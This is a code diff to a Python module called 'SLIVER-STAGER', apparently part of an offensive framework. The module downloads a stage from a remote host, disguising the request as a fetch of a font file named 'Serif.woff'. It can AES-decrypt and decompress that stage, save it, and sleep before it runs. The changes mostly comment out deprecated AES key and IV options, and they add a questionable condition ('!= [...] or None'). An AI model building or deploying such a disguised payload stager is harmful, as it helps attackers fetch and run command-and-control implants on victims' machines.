@@ -1,14 +1,14 @@
 ########################################################
 ### Sliver Module
-### Status: migrated 085
+### Status: migrated 085, check if working
 ###
 ########################################################
 
 #from utils.helper import nstate as nstate
 from utils.style import *
 from utils.helper import CheckFile, GetFileHash
-import os
-if os.name == 'nt':
+from os import name as osname
+if osname == 'nt':
     from utils.windef import *
     from utils.winconst import *
 from time import sleep
@@ -24,9 +24,9 @@ arglist = {
      'remote_port':         { 'value': 4444, 'desc': 'Remote port to connect to' },
      'save':                { 'value': '', 'desc': 'Save the stage as file: --save filename' },
      'sleeptime':           { 'value': 0, 'desc': 'Sleep for x seconds before the stage is executed' },
-     'aes':                 { 'value': ['',''], 'desc': 'AES decrypt the stage after download: --aes <key> <iv>' },
-     'aes_key':             { 'value': '', 'desc': '[Deprecated] Specify the AES key for decryption' },
-     'aes_iv':              { 'value': '', 'desc': '[Deprecated] Specify the AES IV for decryption' },
+     'aes':                 { 'value': ['',''], 'desc': 'AES stage decrypter: --aes <key> <iv> / set aes ["key","iv"]' },
+     #'aes_key':             { 'value': '', 'desc': '[Deprecated] Specify the AES key for decryption' },
+     #'aes_iv':              { 'value': '', 'desc': '[Deprecated] Specify the AES IV for decryption' },
      'compression':         { 'value': 0, 'desc': 'Decompress the stage after download' },
      'headers':             { 'value': False, 'desc': 'Print stage headers' },
      'use_https':           { 'value': True, 'desc': 'Use either https or http' }
@@ -43,14 +43,14 @@ def register_arguments(parser):
         vrb = parser.add_argument_group('more')
         vrb.add_argument('--headers', default=0, action='store_true', required=False, help=arglist['headers']['desc'])
         vrb.add_argument('--use-https', default=True, action='store_true', help=arglist['use_https']['desc'])
-        grp2 = parser.add_argument_group('Deprecated, will be removed in a future release')
-        grp2.add_argument('-ak', '--aes-key', default='', deprecated=True, type=str, required=False, help=arglist['aes_key']['desc'])
-        grp2.add_argument('-ai', '--aes-iv', default='', deprecated=True, type=str, required=False, help=arglist['aes_iv']['desc'])
+        #grp2 = parser.add_argument_group('Deprecated, will be removed in a future release')
+        #grp2.add_argument('-ak', '--aes-key', default='', deprecated=True, type=str, required=False, help=arglist['aes_key']['desc'])
+        #grp2.add_argument('-ai', '--aes-iv', default='', deprecated=True, type=str, required=False, help=arglist['aes_iv']['desc'])
 
 class module:
     
     Author = 'psycore8'
-    Version = '2.2.1'
+    Version = '2.2.2'
     DisplayName = 'SLIVER-STAGER'
     payload_size = 0
     header_16bytes = ''
@@ -74,7 +74,8 @@ class module:
         if ErrorExit:
             exit()
 
-    def __init__(self, remote_host=str, remote_port=int, save=str, sleeptime=int, aes=['', ''], aes_key=None, aes_iv=None, compression=False, headers=False, use_https=True):
+    #def __init__(self, remote_host=str, remote_port=int, save=str, sleeptime=int, aes=['', ''], aes_key=None, aes_iv=None, compression=False, headers=False, use_https=True):
+    def __init__(self, remote_host=str, remote_port=int, save=str, sleeptime=int, aes=['', ''], compression=False, headers=False, use_https=True):
         self.remote_host = remote_host
         self.remote_port = remote_port
         self.save = save
@@ -83,8 +84,8 @@ class module:
         self.use_https = use_https
         self.headers = headers
         self.aes = aes
-        self.aes_key = aes_key
-        self.aes_iv = aes_iv
+        #self.aes_key = aes_key
+        #self.aes_iv = aes_iv
 
     def aes_decrypt(self, data, aes_key, aes_iv):
         cipher = Cipher(algorithms.AES(aes_key.encode('utf-8')), modes.CBC(aes_iv.encode('utf-8')), backend=default_backend())
@@ -107,14 +108,14 @@ class module:
 
     def process(self):
         m = self.msg
-        if self.aes != ['', '']:
-             aes_key = self.aes[0]
-             aes_iv = self.aes[1]
-             print(f'{aes_key} - {aes_iv}')
-        else:
-             aes_key = self.aes_key
-             aes_iv = self.aes_iv
-        print(f'{self.aes_key} - {self.aes_iv}')
+        if self.aes != ['', ''] or None:
+            aes_key = self.aes[0]
+            aes_iv = self.aes[1]
+            print(f'{aes_key} - {aes_iv}')
+        # else:
+        #      aes_key = self.aes_key
+        #      aes_iv = self.aes_iv
+        #print(f'{self.aes_key} - {self.aes_iv}')
         self.msg('pre.head')
         if self.use_https:
             static_url = f'https://{self.remote_host}:{self.remote_port}/Serif.woff'
@@ -135,7 +136,8 @@ class module:
             #self.msg('error.stage_ok')
             m('merror', 'Error during download', True)
 
-        if aes_key:
+        #if aes_key:
+        if self.aes != ['', ''] or None:
             #self.msg('proc.decrypt')
             m('mnote', 'decrypting data')
             if self.headers: self.ph(stage_data[0:16], len(stage_data))
